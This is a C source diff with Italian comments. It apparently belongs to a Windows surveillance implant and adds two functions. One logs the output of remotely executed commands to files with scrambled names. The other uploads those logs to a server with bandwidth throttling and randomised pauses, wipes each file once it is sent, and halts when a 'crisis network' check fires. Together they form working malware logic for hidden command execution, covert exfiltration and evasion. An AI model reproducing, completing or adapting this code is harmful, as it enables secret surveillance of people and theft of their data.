@@ -625,6 +625,53 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 	return hfile;
 }
 
+// Usato per l'output dei comandi
+// N.B. Non sottrae quota disco!
+HANDLE Log_CreateOutputFile(char *command_name)
+{
+	char log_wout_path[128];
+	char file_name[DLLNAMELEN];
+	char *scrambled_name;
+	FILETIME time_nanosec;
+	DWORD out_len, dummy;
+	BYTE *log_header;
+	HANDLE hfile;
+	SECURITY_ATTRIBUTES sa;
+
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if (log_free_space <= MIN_CREATION_SPACE) 
+		return INVALID_HANDLE_VALUE;
+
+	// Usa l'epoch per dare un nome univoco al file
+	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
+
+	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF_%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+	if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
+		return INVALID_HANDLE_VALUE;	
+	HM_CompletePath(scrambled_name, file_name);
+	SAFE_FREE(scrambled_name);
+
+	sa.bInheritHandle = TRUE;
+	sa.nLength = 0;
+	sa.lpSecurityDescriptor = NULL;
+	hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ, &sa, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
+	if (hfile == INVALID_HANDLE_VALUE)
+		return INVALID_HANDLE_VALUE;
+
+	// Scrive l'header nel file
+	log_header = Log_CreateHeader(PM_COMMANDEXEC, (BYTE *)command_name, strlen(command_name) + 1, &out_len);
+	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
+		SAFE_FREE(log_header);
+		CloseHandle(hfile);
+		FNC(DeleteFileA)(file_name);
+		return INVALID_HANDLE_VALUE;
+	}
+	SAFE_FREE(log_header);
+	FNC(FlushFileBuffers)(hfile);
+
+	return hfile;
+}
+
 
 // Chiude un file di log
 void Log_CloseFile(HANDLE handle)
@@ -1183,6 +1230,37 @@ void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWO
 
 
 //------------------- FUNZIONI PER LA SPEDIZIONE DEI LOG ---------------
+
+BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
+{
+	char log_file_path[DLLNAMELEN];
+	WIN32_FIND_DATA FindFileData;
+	char DirSpec[DLLNAMELEN];  
+	char *scrambled_search;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+
+	scrambled_search = LOG_ScrambleName("OUTF*.log", crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return FALSE;
+
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			HM_CompletePath(FindFileData.cFileName, log_file_path);
+			if (IsCrisisNetwork()) 
+				break;
+			if (FindFileData.nFileSizeLow==0 || ASP_SendLog(log_file_path, band_limit)) {
+				HM_WipeFileA(log_file_path);
+				LOG_SendPause(min_sleep, max_sleep);
+			}
+		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+		FNC(FindClose)(hFind);
+	}
+	return TRUE;
+}
 
 // Invia la coda dei log al server
 // I file vuoti vengono semplicemente cancellati
